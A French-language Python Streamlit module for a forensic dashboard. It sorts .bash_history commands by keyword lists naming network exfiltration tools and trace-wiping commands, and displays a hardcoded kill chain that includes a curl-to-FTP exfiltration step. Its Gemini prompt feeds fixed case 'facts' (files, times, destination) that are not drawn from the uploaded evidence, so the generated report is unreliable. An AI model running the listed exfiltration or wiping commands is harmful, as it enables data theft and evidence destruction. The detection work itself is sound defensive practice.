# linux.py
# Analyste : Ismail
# Module : Pôle Serveur Linux - Analyse .bash_history
# Affaire : TechCorp - Fuite de données Projet Orion #2026-TC

import streamlit as st
import pandas as pd
import re
import os
import time
from datetime import datetime
from dotenv import load_dotenv
import google.generativeai as genai
from fpdf import FPDF

# ============================================================
# CONSTANTES DE DÉTECTION
# ============================================================

CATEGORIES_COMMANDES = {
    "reconnaissance": {
        "mots_cles": ["whoami", "hostname", "id", "uname", "ifconfig", "ip a", "netstat", "ps aux", "cat /etc/passwd"],
        "label": "🔍 Reconnaissance",
        "couleur": "#f59e0b",
        "niveau": "MOYEN",
        "description": "Collecte d'informations sur le système"
    },
    "preparation": {
        "mots_cles": ["mkdir", "ls -la", "ls .backup", "du -sh", "find ", "locate ", "cp ", "mv "],
        "label": "📁 Préparation / Staging",
        "couleur": "#f97316",
        "niveau": "ÉLEVÉ",
        "description": "Organisation et préparation des fichiers cibles"
    },
    "exfiltration": {
        "mots_cles": ["curl", "wget", "ftp", "scp ", "rsync", "nc ", "ncat", "upload", "novatek", "jm-transfer",
                      "Projet_Orion", ".7z", "7z a", "zip ", "tar ", "sftp"],
        "label": "📤 Exfiltration de données",
        "couleur": "#dc2626",
        "niveau": "CRITIQUE",
        "description": "Transfert de données vers un serveur externe"
    },
    "script": {
        "mots_cles": ["echo '", 'echo "', "chmod +x", "chmod 7", "> upload", ">> upload", "./upload", "cat upload",
                      ".sh", "bash ", "sh "],
        "label": "⚙️ Création de script",
        "couleur": "#7c3aed",
        "niveau": "CRITIQUE",
        "description": "Automatisation d'une opération malveillante"
    },
    "destruction": {
        "mots_cles": ["rm -rf", "rm -f", "rm ", "history -c", "> ~/.bash_history", "shred", "wipe",
                      "unlink", "truncate", "dd if=/dev/zero"],
        "label": "🗑️ Destruction de preuves",
        "couleur": "#991b1b",
        "niveau": "CRITIQUE",
        "description": "Tentative d'effacement des traces forensiques"
    }
}

FICHIERS_SENSIBLES = [
    "Budget_2026.xlsx", "Emails_Concurrent.txt", "Plans_Confidentiels.pdf",
    "Projet_Orion", ".7z", ".backup"
]

IP_SUSPECTES_EXTERNES = ["185.34.72.15", "novatek-industries.fr", "ftp.novatek"]

# ============================================================
# GÉNÉRATION PDF
# ============================================================

def generate_pdf_report(report_text):
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", 'B', 15)
    pdf.cell(0, 10, "RAPPORT D'INVESTIGATION NUMERIQUE FORENSIQUE", ln=True, align='C')
    pdf.ln(5)

    report_text = (report_text
                   .replace('œ', 'oe').replace('Œ', 'OE')
                   .replace('\u2019', "'").replace('\u201c', '"').replace('\u201d', '"')
                   .replace('\u2013', '-').replace('\u2014', '--'))

    for line in report_text.split('\n'):
        line = line.strip()
        if not line:
            pdf.ln(4)
            continue
        if line.startswith('#'):
            clean_title = line.replace('#', '').replace('*', '').strip().upper()
            pdf.set_font("Arial", 'B', 12)
            safe_title = clean_title.encode('latin-1', 'ignore').decode('latin-1')
            pdf.multi_cell(0, 8, txt=safe_title)
            pdf.ln(2)
        else:
            clean_line = line.replace('**', '').replace('*', '-').replace('`', '')
            pdf.set_font("Arial", size=11)
            safe_line = clean_line.encode('latin-1', 'ignore').decode('latin-1')
            pdf.multi_cell(0, 6, txt=safe_line)

    return pdf.output(dest="S").encode("latin-1")


# ============================================================
# PARSING ET ANALYSE DU BASH_HISTORY
# ============================================================

def analyser_commande(ligne):
    """Analyse une commande et retourne sa catégorie et son niveau de danger."""
    ligne_lower = ligne.lower()
    categories_detectees = []

    for cat_id, cat_info in CATEGORIES_COMMANDES.items():
        for mot in cat_info["mots_cles"]:
            if mot.lower() in ligne_lower:
                categories_detectees.append({
                    "id": cat_id,
                    "label": cat_info["label"],
                    "couleur": cat_info["couleur"],
                    "niveau": cat_info["niveau"],
                    "description": cat_info["description"],
                    "mot_detecte": mot
                })
                break  # une seule catégorie par commande (priorité première trouvée)

    # Fichiers sensibles détectés dans la commande
    fichiers_trouves = [f for f in FICHIERS_SENSIBLES if f.lower() in ligne_lower]

    # IPs/domaines externes
    ip_trouvees = [ip for ip in IP_SUSPECTES_EXTERNES if ip.lower() in ligne_lower]

    return {
        "categories": categories_detectees,
        "fichiers_sensibles": fichiers_trouves,
        "ip_externes": ip_trouvees,
        "est_suspect": len(categories_detectees) > 0
    }


def parser_bash_history(contenu):
    """Parse le contenu du bash_history ligne par ligne."""
    lignes = [l.strip() for l in contenu.strip().split('\n') if l.strip()]
    resultats = []

    for i, ligne in enumerate(lignes):
        analyse = analyser_commande(ligne)
        resultats.append({
            "index": i + 1,
            "commande": ligne,
            **analyse
        })

    return resultats, lignes


def calculer_kpis(resultats):
    """Calcule les métriques clés depuis les résultats d'analyse."""
    total = len(resultats)
    suspects = [r for r in resultats if r["est_suspect"]]
    critiques = [r for r in resultats
                 if any(c["niveau"] == "CRITIQUE" for c in r["categories"])]

    tous_fichiers = []
    for r in resultats:
        tous_fichiers.extend(r["fichiers_sensibles"])

    toutes_ips = []
    for r in resultats:
        toutes_ips.extend(r["ip_externes"])

    categories_count = {}
    for r in resultats:
        for cat in r["categories"]:
            cid = cat["id"]
            categories_count[cid] = categories_count.get(cid, 0) + 1

    return {
        "total_commandes": total,
        "commandes_suspectes": len(suspects),
        "commandes_critiques": len(critiques),
        "fichiers_detectes": list(set(tous_fichiers)),
        "ips_detectees": list(set(toutes_ips)),
        "categories_count": categories_count
    }


# ============================================================
# AFFICHAGE - ONGLET ANALYSE BASH
# ============================================================

def afficher_analyse_bash(resultats, lignes):
    kpis = calculer_kpis(resultats)

    # ---- ALERTE CRITIQUE ----
    if kpis["commandes_critiques"] > 0:
        st.error(
            "🚨 **ALERTE CRITIQUE : EXFILTRATION DÉTECTÉE** — "
            "L'historique Bash de jmartin révèle une chaîne d'actions malveillantes : "
            "préparation, compression, transfert FTP externe et destruction des traces."
        )

    # ---- KPIs ----
    st.markdown("### 📊 Métriques de l'Investigation")
    c1, c2, c3, c4 = st.columns(4)
    c1.metric("📋 Total Commandes", kpis["total_commandes"])
    c2.metric("⚠️ Commandes Suspectes", kpis["commandes_suspectes"],
              f"{round(kpis['commandes_suspectes']/kpis['total_commandes']*100)}% du total")
    c3.metric("🔴 Niveau CRITIQUE", kpis["commandes_critiques"], "Exfiltration + Destruction")
    c4.metric("📁 Fichiers Identifiés", len(kpis["fichiers_detectes"]), "Documents Orion")

    st.markdown("---")

    # ---- KILL CHAIN ----
    st.markdown("### ⚔️ Reconstruction de la Kill Chain")

    kill_chain = [
        ("1", "🔍 Reconnaissance", "Identification du système et de l'environnement", "#f59e0b",
         ["whoami", "hostname", "ls -la"]),
        ("2", "📁 Staging", "Création du dossier caché .backup et vérification des fichiers cibles", "#f97316",
         ["mkdir -p .backup", "ls .backup/Budget_2026.xlsx ...", "du -sh .backup/*"]),
        ("3", "⚙️ Weaponization", "Création d'un script automatisé d'archivage et de transfert FTP", "#7c3aed",
         ["echo '#!/bin/bash' > upload.sh", "chmod +x upload.sh"]),
        ("4", "📤 Exfiltration", "Compression 7z + transfert FTP vers ftp.novatek-industries.fr", "#dc2626",
         ["./upload.sh", "→ 7z a Projet_Orion_COMPLET.7z", "→ curl -T ... ftp://ftp.novatek-industries.fr"]),
        ("5", "🗑️ Destruction", "Suppression des fichiers, du script et effacement de l'historique", "#991b1b",
         ["rm -rf .backup/", "rm Projet_Orion_COMPLET.7z", "history -c", "> ~/.bash_history"]),
    ]

    cols = st.columns(5)
    for col, (num, titre, desc, couleur, cmds) in zip(cols, kill_chain):
        with col:
            st.markdown(f"""
            <div style="background:{couleur}15; border:2px solid {couleur}; border-radius:10px;
                        padding:12px; text-align:center; min-height:180px;">
                <div style="font-size:1.8rem; font-weight:900; color:{couleur};">{num}</div>
                <div style="font-weight:bold; font-size:0.85rem; color:{couleur}; margin-bottom:6px;">{titre}</div>
                <div style="font-size:0.75rem; color:#374151; margin-bottom:8px;">{desc}</div>
                <div style="font-size:0.7rem; font-family:monospace; color:#6b7280;">
                    {"<br>".join(cmds)}
                </div>
            </div>
            """, unsafe_allow_html=True)

    st.markdown("---")

    # ---- TABLEAU DÉTAILLÉ ----
    st.markdown("### 🔬 Analyse Ligne par Ligne")

    filtre = st.selectbox(
        "Filtrer par catégorie :",
        options=["Toutes les commandes", "Suspectes uniquement", "CRITIQUE uniquement",
                 "Reconnaissance", "Préparation", "Exfiltration", "Script", "Destruction"],
        key="filtre_bash"
    )

    for r in resultats:
        commande = r["commande"]
        cats = r["categories"]
        fichiers = r["fichiers_sensibles"]
        ips = r["ip_externes"]

        # Filtrage
        if filtre == "Suspectes uniquement" and not r["est_suspect"]:
            continue
        if filtre == "CRITIQUE uniquement" and not any(c["niveau"] == "CRITIQUE" for c in cats):
            continue
        filtre_to_cat = {
            "Reconnaissance": "reconnaissance", "Préparation": "preparation",
            "Exfiltration": "exfiltration", "Script": "script", "Destruction": "destruction"
        }
        if filtre in filtre_to_cat:
            if not any(c["id"] == filtre_to_cat[filtre] for c in cats):
                continue

        # Couleur de fond
        if any(c["niveau"] == "CRITIQUE" for c in cats):
            bg = "#fff1f2"
            border = "#dc2626"
        elif any(c["niveau"] == "ÉLEVÉ" for c in cats):
            bg = "#fff7ed"
            border = "#f97316"
        elif cats:
            bg = "#fffbeb"
            border = "#f59e0b"
        else:
            bg = "#f9fafb"
            border = "#e5e7eb"

        badges = "".join([
            f'<span style="background:{c["couleur"]}22; color:{c["couleur"]}; '
            f'border:1px solid {c["couleur"]}44; border-radius:4px; '
            f'padding:2px 8px; font-size:0.75rem; margin-right:4px;">{c["label"]}</span>'
            for c in cats
        ])

        fichiers_html = ""
        if fichiers:
            fichiers_html = "<br><span style='font-size:0.75rem; color:#dc2626;'>📁 " + \
                            " | ".join(fichiers) + "</span>"

        ips_html = ""
        if ips:
            ips_html = "<br><span style='font-size:0.75rem; color:#7c3aed;'>🌐 " + \
                       " | ".join(ips) + "</span>"

        st.markdown(f"""
        <div style="background:{bg}; border-left:4px solid {border};
                    border-radius:6px; padding:10px 14px; margin-bottom:8px;">
            <div style="display:flex; justify-content:space-between; align-items:flex-start;">
                <code style="font-size:0.9rem; color:#1e293b; background:transparent;">{commande}</code>
                <span style="font-size:0.7rem; color:#94a3b8; white-space:nowrap; margin-left:10px;">
                    #{r['index']:02d}
                </span>
            </div>
            <div style="margin-top:6px;">{badges}</div>
            {fichiers_html}{ips_html}
        </div>
        """, unsafe_allow_html=True)

    st.markdown("---")

    # ---- GRAPHIQUE RÉPARTITION ----
    st.markdown("### 📈 Répartition des Catégories Suspectes")
    cat_labels = {
        "reconnaissance": "Reconnaissance",
        "preparation": "Préparation",
        "exfiltration": "Exfiltration",
        "script": "Script malveillant",
        "destruction": "Destruction preuves"
    }
    if kpis["categories_count"]:
        df_chart = pd.DataFrame([
            {"Catégorie": cat_labels.get(k, k), "Occurrences": v}
            for k, v in kpis["categories_count"].items()
        ])
        st.bar_chart(df_chart.set_index("Catégorie"))

    # ---- FICHIERS EXFILTRÉS ----
    st.markdown("### 📁 Fichiers Sensibles Identifiés")
    fichiers_info = [
        ("Budget_2026.xlsx", "Données financières — Niveau : CONFIDENTIEL"),
        ("Emails_Concurrent.txt", "Correspondance interne sensible — Niveau : CONFIDENTIEL"),
        ("Plans_Confidentiels.pdf", "Documentation technique Projet Orion — Niveau : SECRET"),
        ("Projet_Orion_COMPLET.7z", "Archive chiffrée — Objet de l'exfiltration (FTP)"),
    ]
    for fname, fdesc in fichiers_info:
        st.markdown(f"""
        <div style="background:#fff1f2; border:1px solid #fecaca; border-left:4px solid #dc2626;
                    border-radius:6px; padding:10px 14px; margin-bottom:6px;">
            <b style="color:#991b1b;">📄 {fname}</b><br>
            <span style="font-size:0.85rem; color:#374151;">{fdesc}</span>
        </div>
        """, unsafe_allow_html=True)

    # ---- SERVEUR EXTERNE ----
    st.markdown("### 🌐 Serveur d'Exfiltration Identifié")
    st.markdown("""
    <div style="background:#faf5ff; border:1px solid #c4b5fd; border-left:4px solid #7c3aed;
                border-radius:6px; padding:14px; margin-bottom:6px;">
        <b style="color:#6d28d9;">🎯 Destination :</b> <code>ftp.novatek-industries.fr</code>
        (IP : <code>185.34.72.15</code>)<br>
        <b style="color:#6d28d9;">👤 Compte FTP :</b> <code>jm-transfer</code><br>
        <b style="color:#6d28d9;">📂 Chemin :</b> <code>/incoming/jmartin/</code><br>
        <b style="color:#6d28d9;">📦 Fichier transféré :</b> <code>Projet_Orion_COMPLET.7z</code>
    </div>
    """, unsafe_allow_html=True)


# ============================================================
# AFFICHAGE - ONGLET CONFORMITÉ FORENSIQUE
# ============================================================

def afficher_conformite(contenu_raw):
    import hashlib

    st.markdown("### 🔐 Conformité Forensique — ISO/IEC 27037:2012")

    st.markdown("""
    <div style="background:#f0fdf4; border:1px solid #86efac; border-radius:8px; padding:16px; margin-bottom:16px;">
        <b>✅ Standards appliqués :</b><br>
        <b>ISO/IEC 27037:2012</b> — Identification, collecte, acquisition et préservation des preuves numériques.<br><br>
        <b>Phases appliquées :</b><br>
        1. <b>Identification</b> : Fichier <code>.bash_history</code> localisé dans <code>/home/jmartin/</code><br>
        2. <b>Collection</b> : Extraction forensique via Autopsy 4.22.1 depuis <code>serveur-pivot-bash.img</code><br>
        3. <b>Acquisition</b> : Hash MD5/SHA-256 calculés à l'acquisition<br>
        4. <b>Préservation</b> : Chaîne de garde maintenue — fichier original non modifié
    </div>
    """, unsafe_allow_html=True)

    st.subheader("🔐 Empreintes d'Intégrité du Fichier")

    contenu_bytes = contenu_raw.encode("utf-8")
    md5_val = hashlib.md5(contenu_bytes).hexdigest()
    sha256_val = hashlib.sha256(contenu_bytes).hexdigest()
    sha1_val = hashlib.sha1(contenu_bytes).hexdigest()
    taille = len(contenu_bytes)

    col1, col2 = st.columns(2)
    with col1:
        st.markdown(f"""
        <div style="background:#1e293b; color:#e2e8f0; border-radius:8px; padding:16px; font-family:monospace; font-size:0.85rem;">
            <span style="color:#94a3b8;">Fichier    :</span> .bash_history<br>
            <span style="color:#94a3b8;">Taille     :</span> {taille} octets<br>
            <span style="color:#94a3b8;">MD5        :</span> <span style="color:#4ade80;">{md5_val}</span><br>
            <span style="color:#94a3b8;">SHA-1      :</span> <span style="color:#60a5fa;">{sha1_val}</span><br>
            <span style="color:#94a3b8;">SHA-256    :</span> <span style="color:#c084fc;">{sha256_val}</span>
        </div>
        """, unsafe_allow_html=True)
    with col2:
        st.markdown(f"""
        <div style="background:#f0fdf4; border:1px solid #86efac; border-radius:8px; padding:16px; font-size:0.85rem;">
            <b>✅ Source</b><br>
            Image : <code>serveur-pivot-bash.img</code><br>
            Chemin : <code>/home/jmartin/.bash_history</code><br>
            Outil  : Autopsy 4.22.1<br><br>
            <b>✅ Statut</b><br>
            Fichier extrait sans altération.<br>
            Modificated Time : <code>2026-02-21 23:01:55 WET</code>
        </div>
        """, unsafe_allow_html=True)

    st.subheader("📋 Chaîne de Garde (Chain of Custody)")

    custody_data = [
        {"Étape": "1 - Acquisition image", "Responsable": "Ismail", "Date": "2026-03-21",
         "Action": "Création image EXT4 serveur-pivot-bash.img", "Statut": "✅"},
        {"Étape": "2 - Chargement Autopsy", "Responsable": "Ismail", "Date": "2026-03-21",
         "Action": "Import dans Autopsy 4.22.1 — Data Source", "Statut": "✅"},
        {"Étape": "3 - Extraction", "Responsable": "Ismail", "Date": "2026-04-13",
         "Action": "Extract File(s) → bash_history.txt", "Statut": "✅"},
        {"Étape": "4 - Analyse DFIR", "Responsable": "Ismail", "Date": "2026-04-13",
         "Action": "Parsing forensique et catégorisation des commandes", "Statut": "✅"},
        {"Étape": "5 - Rapport IA", "Responsable": "Ismail / Gemini", "Date": "2026-04-13",
         "Action": "Génération rapport d'expertise automatisé", "Statut": "🔄"},
    ]

    df_custody = pd.DataFrame(custody_data)
    st.dataframe(df_custody, use_container_width=True, hide_index=True)


# ============================================================
# RAPPORT IA — GEMINI STREAMING
# ============================================================

def afficher_rapport_ia(resultats, contenu_raw):
    load_dotenv()

    st.markdown("### 🤖 Génération du Rapport d'Expertise Linux")
    st.info(
        "Ce module exploite l'IA (Gemini 2.5 Flash) pour rédiger un rapport d'investigation formel "
        "basé exclusivement sur les artefacts extraits du fichier `.bash_history` de jmartin."
    )

    api_key = os.getenv("GEMINI_API_KEY")
    if api_key:
        st.success("🔒 Clé API chargée de manière sécurisée via l'environnement local.")
    else:
        st.warning("⚠️ Clé API introuvable. Veuillez l'insérer manuellement :")
        api_key = st.text_input("🔑 Clé API Google Gemini :", type="password", key="api_key_linux")

    if "rapport_linux_ia" not in st.session_state:
        st.session_state.rapport_linux_ia = None

    if st.button("⚖️ Générer le Rapport Officiel", type="primary", key="gen_rapport_linux"):
        if not api_key:
            st.error("❌ Une clé API valide est requise.")
        else:
            status_box = st.info("🔄 Initialisation du moteur d'analyse et transmission des artefacts...")
            report_placeholder = st.empty()

            try:
                start_time = time.time()
                genai.configure(api_key=api_key)
                model = genai.GenerativeModel('gemini-2.5-flash')

                kpis = calculer_kpis(resultats)

                # Construction des faits forensiques
                faits = []
                faits.append(f"- Fichier analysé : .bash_history de l'utilisateur jmartin (uid=1002) sur srv-intern01")
                faits.append(f"- Total de {kpis['total_commandes']} commandes, dont {kpis['commandes_suspectes']} suspectes et {kpis['commandes_critiques']} critiques")

                if "reconnaissance" in kpis["categories_count"]:
                    faits.append("- Phase de reconnaissance : exécution de whoami, hostname, ls -la pour identifier l'environnement")

                if "preparation" in kpis["categories_count"]:
                    faits.append("- Phase de staging : création d'un dossier caché .backup contenant Budget_2026.xlsx, Emails_Concurrent.txt, Plans_Confidentiels.pdf")

                if "script" in kpis["categories_count"]:
                    faits.append("- Création d'un script upload.sh automatisant la compression 7z et le transfert FTP vers ftp.novatek-industries.fr")

                if "exfiltration" in kpis["categories_count"]:
                    faits.append("- Exfiltration confirmée : transfert de Projet_Orion_COMPLET.7z vers ftp.novatek-industries.fr/incoming/jmartin/ avec le compte jm-transfer (21/02/2026 ~22:30)")

                if "destruction" in kpis["categories_count"]:
                    faits.append("- Anti-forensics : rm -rf .backup/, suppression du script, history -c et effacement de ~/.bash_history")

                faits.append("- Corrélation réseau (pcap) : session SSH jmartin depuis 192.168.1.47 vers srv-intern01 (192.168.1.200) de 21:52 à 23:02")

                faits_texte = "\n".join(faits)

                prompt = f"""Agissez en tant qu'Expert Analyste DFIR (Digital Forensics and Incident Response).
Rédigez un rapport d'investigation formel, structuré et impartial pour le dossier #2026-TC.
Périmètre technique : Serveur Linux (srv-intern01), analyse de l'historique Bash de l'utilisateur jmartin.
Sujet audité : "M. Jean Martin" (jmartin, uid=1002).

ÉLÉMENTS FACTUELS EXTRAITS DES SCELLÉS (basez votre analyse strictement sur ces points) :
{faits_texte}

INSTRUCTIONS DE RÉDACTION :
1. TON : Académique, objectif, factuel et procédural.
2. EN-TÊTE OBLIGATOIRE :
🏛️ DÉPARTEMENT DES INVESTIGATIONS NUMÉRIQUES (DFIR) 🏛️
**RAPPORT D'EXPERTISE FORENSIQUE : PÔLE SERVEUR LINUX**
**Date d'émission :** 13 avril 2026
**Référence Dossier :** #2026-TC
**Sujet Ciblé :** M. Jean Martin (jmartin)
**Analyste :** Ismail

3. STRUCTURE EXIGÉE :
# I. RÉSUMÉ EXÉCUTIF
# II. ANALYSE DE LA CHAÎNE D'ACTIONS (KILL CHAIN)
# III. QUALIFICATION DE L'EXFILTRATION (ACTUS REUS)
# IV. MANŒUVRES ANTI-FORENSICS ET OBSTRUCTION
# V. CORRÉLATION AVEC LES AUTRES PREUVES
# VI. CONCLUSION TECHNIQUE ET RECOMMANDATIONS

4. FORMATAGE : Markdown standard. Pas de blocs de code (```). Pas d'indentation en début de ligne.
"""

                status_box.info("🧠 Génération du rapport en cours via Gemini 2.5 Flash...")

                full_report = ""
                response = model.generate_content(prompt, stream=True)

                for chunk in response:
                    try:
                        full_report += chunk.text
                        report_placeholder.markdown(full_report + " ▌")
                    except Exception:
                        continue

                end_time = time.time()
                temps_ecoule = round(end_time - start_time, 2)

                if not full_report.strip():
                    status_box.empty()
                    st.error("❌ La génération a échoué. Vérifiez votre clé API.")
                else:
                    clean_report = full_report.replace("```text", "").replace("```markdown", "").replace("```", "").strip()

                    report_placeholder.markdown(f"""
                    <div style="background-color:#ffffff; padding:50px; border-radius:4px;
                                box-shadow:0 10px 30px rgba(0,0,0,0.10); margin-top:20px;
                                border-top:15px solid #1e3a8a; font-family:'Times New Roman', serif;
                                color:#111827; line-height:1.6;">
                        {clean_report}
                    </div>
                    """, unsafe_allow_html=True)

                    st.session_state.rapport_linux_ia = clean_report
                    status_box.empty()
                    st.success(f"✅ Rapport finalisé en {temps_ecoule} secondes.")

            except Exception as e:
                status_box.empty()
                st.error(f"❌ Erreur lors de l'appel API : {str(e)}")

    # Bouton PDF (hors boucle)
    if st.session_state.rapport_linux_ia:
        pdf_bytes = generate_pdf_report(st.session_state.rapport_linux_ia)
        st.download_button(
            label="📥 Exporter le Rapport Officiel (Format PDF)",
            data=pdf_bytes,
            file_name="Rapport_Expertise_Linux_2026_TC.pdf",
            mime="application/pdf",
            type="primary",
            key="dl_pdf_linux"
        )

        st.markdown("""
        <style>
            .report-linux-container {
                background-color: #ffffff;
                padding: 50px;
                border-radius: 4px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.15);
                margin-top: 20px;
                border-top: 15px solid #1e3a8a;
                font-family: 'Times New Roman', Times, serif;
                color: #111827;
                line-height: 1.6;
            }
            .report-linux-container h1, .report-linux-container h2, .report-linux-container h3 {
                color: #0f172a;
                font-family: 'Segoe UI', Tahoma, Geneva, sans-serif;
            }
        </style>
        """, unsafe_allow_html=True)

        st.markdown('<div class="report-linux-container">', unsafe_allow_html=True)
        st.markdown(st.session_state.rapport_linux_ia, unsafe_allow_html=True)
        st.markdown('</div>', unsafe_allow_html=True)


# ============================================================
# FONCTION PRINCIPALE run()
# ============================================================

def run():
    load_dotenv()

    # CSS cohérent avec le reste du dashboard
    st.markdown("""
    <style>
        [data-testid="stFileUploader"] {
            background-color: #f0fdf4;
            border: 2px dashed #16a34a;
            border-radius: 15px;
            padding: 15px;
            transition: all 0.3s ease;
        }
        [data-testid="stFileUploader"]:hover {
            background-color: #dcfce7;
            border-color: #dc2626;
        }
        [data-testid="stFileUploader"] button {
            background-color: #16a34a;
            color: white;
            border-radius: 8px;
            font-weight: bold;
        }
    </style>
    """, unsafe_allow_html=True)

    # En-tête
    st.markdown("""
    <div style="display:flex; align-items:center; gap:10px;">
        <h1 style="margin:0; color:#1E3A8A;">🐧 Pôle d'Analyse : Serveur Linux</h1>
    </div>
    <p style="font-size:14px; color:gray;">
        <b>Analyste Principal :</b> Ismail &nbsp;|&nbsp;
        <b>Cible :</b> serveur-pivot-bash.img (/home/jmartin/.bash_history) &nbsp;|&nbsp;
        <b>Outils :</b> Autopsy 4.22.1, Python Data-Stack
    </p>
    <hr style="margin-top:0px; margin-bottom:20px;">
    """, unsafe_allow_html=True)

    # Tabs
    tab_upload, tab_bash, tab_conformite, tab_ia = st.tabs([
        "📥 0. UPLOAD",
        "💻 1. ANALYSE BASH",
        "🔐 2. CONFORMITÉ",
        "🤖 3. RAPPORT IA"
    ])

    # ---- TAB 0 : UPLOAD ----
    with tab_upload:
        st.markdown("""
        <div style="background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%);
                    padding: 30px; border-radius: 15px; text-align: center;
                    border: 1px solid #86efac; margin-bottom: 20px;
                    box-shadow: 0 4px 6px rgba(0,0,0,0.05);">
            <h2 style="color: #15803d; margin-top: 0px; font-weight: 800;">
                ☁️ Espace de Téléversement Sécurisé
            </h2>
            <p style="color: #14532d; font-size: 16px; margin-bottom: 0px;">
                Glissez et déposez votre fichier <b>.bash_history</b> extrait depuis Autopsy.<br>
                <small>(Renommez-le en <code>bash_history.txt</code> avant l'upload si nécessaire)</small>
            </p>
        </div>
        """, unsafe_allow_html=True)

        uploaded_file = st.file_uploader(
            "Uploadez bash_history.txt ici",
            accept_multiple_files=False,
            type=['txt', 'log'],
            label_visibility="collapsed",
            key="bash_uploader"
        )

        if uploaded_file:
            st.success(f"📦 **Fichier détecté :** `{uploaded_file.name}` ({uploaded_file.size} octets)")

            if st.button("🚀 Lancer l'Analyse Forensique", use_container_width=True, type="primary"):
                with st.spinner("🔄 Parsing de l'historique Bash en cours..."):
                    contenu = uploaded_file.getvalue().decode("utf-8")
                    resultats, lignes = parser_bash_history(contenu)
                    st.session_state["linux_resultats"] = resultats
                    st.session_state["linux_lignes"] = lignes
                    st.session_state["linux_contenu_raw"] = contenu

                kpis = calculer_kpis(resultats)
                st.success(f"✅ Analyse terminée ! **{len(lignes)} commandes** parsées, "
                           f"**{kpis['commandes_critiques']} critiques** détectées.")

                c1, c2, c3 = st.columns(3)
                c1.info(f"**📋 Commandes totales :** {kpis['total_commandes']}")
                c2.warning(f"**⚠️ Suspectes :** {kpis['commandes_suspectes']}")
                c3.error(f"**🔴 Critiques :** {kpis['commandes_critiques']}")
        else:
            st.warning("⚠️ Veuillez uploader le fichier `bash_history.txt` extrait depuis Autopsy.")

    locked_msg = "🔒 **Section verrouillée.** Uploadez et analysez le fichier dans l'onglet '0. UPLOAD'."

    # ---- TAB 1 : ANALYSE BASH ----
    with tab_bash:
        if "linux_resultats" not in st.session_state:
            st.warning(locked_msg)
        else:
            afficher_analyse_bash(
                st.session_state["linux_resultats"],
                st.session_state["linux_lignes"]
            )

    # ---- TAB 2 : CONFORMITÉ ----
    with tab_conformite:
        if "linux_contenu_raw" not in st.session_state:
            st.warning(locked_msg)
        else:
            afficher_conformite(st.session_state["linux_contenu_raw"])

    # ---- TAB 3 : RAPPORT IA ----
    with tab_ia:
        if "linux_resultats" not in st.session_state:
            st.warning(locked_msg)
        else:
            afficher_rapport_ia(
                st.session_state["linux_resultats"],
                st.session_state["linux_contenu_raw"]
            )
